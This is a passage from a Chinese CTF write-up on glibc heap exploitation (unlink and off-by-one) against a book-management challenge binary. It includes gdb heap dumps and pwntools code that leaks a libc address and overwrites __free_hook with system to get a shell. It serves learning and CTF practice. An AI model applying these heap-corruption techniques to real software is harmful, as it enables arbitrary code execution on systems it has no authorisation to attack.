    0x5653ee7a51d0: 0x0000000000000000  0x0000000000000101 #伪造的chunk记为p
    0x5653ee7a51e0: 0x00005653ee7a5168  0x00005653ee7a5170
    0x5653ee7a51f0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5200: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5210: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5220: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5230: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5240: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5250: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5260: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5270: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5280: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5290: 0x0000000000000000  0x0000000000000000
    0x5653ee7a52a0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a52b0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a52c0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a52d0: 0x0000000000000100  0x0000000000000100 #chunk5
    0x5653ee7a52e0: 0x0000746567726174  0x0000000000000000 #实际可以写部分
    0x5653ee7a52f0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5300: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5310: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5320: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5330: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5340: 0x0000000000000000  0x0000000000000000
这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力  
remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc  
还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥  
假设我们chunk4数据部分的地址为myptr  
这里unlink(p)
  1. FD = ptr-0x18
  2. BK = ptr-0x10
  3. 检测FD->bk==p? && BK->fd == p?
  4. 检测成功过后
  5. FD->bk  FD+0x18  _(ptr-0x18+0x18) = BK = ptr-0x10 实际就是_ ptr=ptr-0x10
  6. BK->FD  BK+0x10  _(ptr-0x10+0x10) = FD = ptr-0x18 实际就是_ ptr=ptr-0x18  
重点在第6行，我们将*ptr改成了ptr-0x18
看ptr是哪里
    gdb-peda$ x/10gx 0x5577f976f080-0x80+0x180
    0x5577f976f180: 0x00005577f976f168  0x0000000000000108
    0x5577f976f190: 0x0000000000000000  0x0000000000000031
    0x5577f976f1a0: 0x0000003333333333  0x00005577f976f140
    0x5577f976f1b0: 0x00005577f976f170  0x0000000000000020
    0x5577f976f1c0: 0x0000000000000000  0x0000000000000111
从整体来看
    gdb-peda$ x/50gx 0x5577f976f080
    0x5577f976f080: 0x0000000000000001  0x00005577f976f020
    0x5577f976f090: 0x00005577f976f050  0x0000000000000020
    0x5577f976f0a0: 0x0000000000000000  0x0000000000000031
    0x5577f976f0b0: 0x0000000000000006  0x00005577f976f0e0
    0x5577f976f0c0: 0x00005577f976f3e0  0x0000000000000200
    0x5577f976f0d0: 0x0000000000000000  0x0000000000000031
    0x5577f976f0e0: 0x0068732f6e69622f  0x0000000000000000
    0x5577f976f0f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f100: 0x0000000000000000  0x0000000000000031
    0x5577f976f110: 0x00005577f976f130  0x00005577f976f140
    0x5577f976f120: 0x00005577f976f2e0  0x00000000000000f0
    0x5577f976f130: 0x0000000000000000  0x0000000000000031
    0x5577f976f140: 0x0000000000000000  0x0000000000000000
    0x5577f976f150: 0x0000000000000000  0x0000000000000000
    0x5577f976f160: 0x0000000000000000  0x0000000000000031
    0x5577f976f170: 0x0000557700000004  0x00005577f976f1a0 #book4结构体
    0x5577f976f180: 0x00005577f976f168  0x0000000000000108 #ptr，
    0x5577f976f190: 0x0000000000000000  0x0000000000000031
    0x5577f976f1a0: 0x0000003333333333  0x00005577f976f140
    0x5577f976f1b0: 0x00005577f976f170  0x0000000000000020
    0x5577f976f1c0: 0x0000000000000000  0x0000000000000111
    0x5577f976f1d0: 0x0000000000000000  0x0000000000000201
    0x5577f976f1e0: 0x00007f452ad38b78  0x00007f452ad38b78
    0x5577f976f1f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f200: 0x0000000000000000  0x0000000000000000
*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168
这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针
合并效果
    gdb-peda$ x/50gx 0x5577f976f1c0
    0x5577f976f1c0: 0x0000000000000000  0x0000000000000111
    0x5577f976f1d0: 0x0000000000000000  0x0000000000000201
    0x5577f976f1e0: 0x00007f452ad38b78  0x00007f452ad38b78
    0x5577f976f1f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f200: 0x0000000000000000  0x0000000000000000
    0x5577f976f210: 0x0000000000000000  0x0000000000000000
    0x5577f976f220: 0x0000000000000000  0x0000000000000000
    0x5577f976f230: 0x0000000000000000  0x0000000000000000
    0x5577f976f240: 0x0000000000000000  0x0000000000000000
    0x5577f976f250: 0x0000000000000000  0x0000000000000000
    0x5577f976f260: 0x0000000000000000  0x0000000000000000
    0x5577f976f270: 0x0000000000000000  0x0000000000000000
    0x5577f976f280: 0x0000000000000000  0x0000000000000000
    0x5577f976f290: 0x0000000000000000  0x0000000000000000
    0x5577f976f2a0: 0x0000000000000000  0x0000000000000000
    0x5577f976f2b0: 0x0000000000000000  0x0000000000000000
    0x5577f976f2c0: 0x0000000000000000  0x0000000000000000
    0x5577f976f2d0: 0x0000000000000100  0x0000000000000100
    0x5577f976f2e0: 0x0000746567726174  0x0000000000000000
    0x5577f976f2f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f300: 0x0000000000000000  0x0000000000000000
    0x5577f976f310: 0x0000000000000000  0x0000000000000000
    0x5577f976f320: 0x0000000000000000  0x0000000000000000
    0x5577f976f330: 0x0000000000000000  0x0000000000000000
    0x5577f976f340: 0x0000000000000000  0x0000000000000000
##### 再次修改book4的结构体
    payload = p64(0x30) + p64(4) + p64(first_heap+0x40)*2
        edit(4, payload)
        edit(4, p64(heap_base + 0x1e0))
        printf()
        for _ in range(3):
            io.recvuntil('Description: ')
        content = io.recvline()
        io.info(content)
        libc_base = u64(content.strip().ljust(8, '\x00'))-0x3c4b7
        io.success("libc_base: 0x%x" % libc_base)
        system_addr = libc_base + libc.symbols['system']
        io.success('system: 0x%x' % system_addr)
        free_hook = libc_base + libc.symbols['__free_hook']
0x30是他原来大小，4为id 4，
然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，  
第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base +
0x1e0处，为什么是这里，看上面  
从整体来看
    gdb-peda$ x/50gx 0x5577f976f080
    0x5577f976f080: 0x0000000000000001  0x00005577f976f020
    0x5577f976f090: 0x00005577f976f050  0x0000000000000020
    0x5577f976f0a0: 0x0000000000000000  0x0000000000000031
    0x5577f976f0b0: 0x0000000000000006  0x00005577f976f0e0
    0x5577f976f0c0: 0x00005577f976f3e0  0x0000000000000200
    0x5577f976f0d0: 0x0000000000000000  0x0000000000000031
    0x5577f976f0e0: 0x0068732f6e69622f  0x0000000000000000
    0x5577f976f0f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f100: 0x0000000000000000  0x0000000000000031
    0x5577f976f110: 0x00005577f976f130  0x00005577f976f140
    0x5577f976f120: 0x00005577f976f2e0  0x00000000000000f0
    0x5577f976f130: 0x0000000000000000  0x0000000000000031
    0x5577f976f140: 0x0000000000000000  0x0000000000000000
    0x5577f976f150: 0x0000000000000000  0x0000000000000000
    0x5577f976f160: 0x0000000000000000  0x0000000000000031
    0x5577f976f170: 0x0000557700000004  0x00005577f976f1a0 
    0x5577f976f180: 0x00005577f976f168  0x0000000000000108 
    0x5577f976f190: 0x0000000000000000  0x0000000000000031
    0x5577f976f1a0: 0x0000003333333333  0x00005577f976f140
    0x5577f976f1b0: 0x00005577f976f170  0x0000000000000020
    0x5577f976f1c0: 0x0000000000000000  0x0000000000000111
    0x5577f976f1d0: 0x0000000000000000  0x0000000000000201
    0x5577f976f1e0: 0x00007f452ad38b78  0x00007f452ad38b78 #libc地址
    0x5577f976f1f0: 0x0000000000000000  0x0000000000000000
    0x5577f976f200: 0x0000000000000000  0x0000000000000000
这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的
##### 任意地址写
    payload = p64(free_hook) + p64(0x200)
        edit(4, payload)
        edit(6, p64(system_addr))
        io.success('first_heap: 0x%x' % first_heap)
        remove(6)
        #gdb.attach(io)
  1. edit(4,payload)这里将book6的description指针指向free_hook
  2. 然后edit是改成system地址，最后调用一次free就成了  
## 课后小知识总结
  3. 在gdb中用find查找字符串，可以获得指定位置
  4. 堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块
  5. 在计算的时候可以以一个为基地址，这样好计算
  6. vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块
  7. 具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了  
## 总结
  8. 题目不难，但自己做确实有点难度，研究了好久
  9. 写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我
  10. 要开学了，另一道题目下次在研究了，off-by-one另一道题目
  11. 这道题同时学习了unlink跟off-by-one
  12. 我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)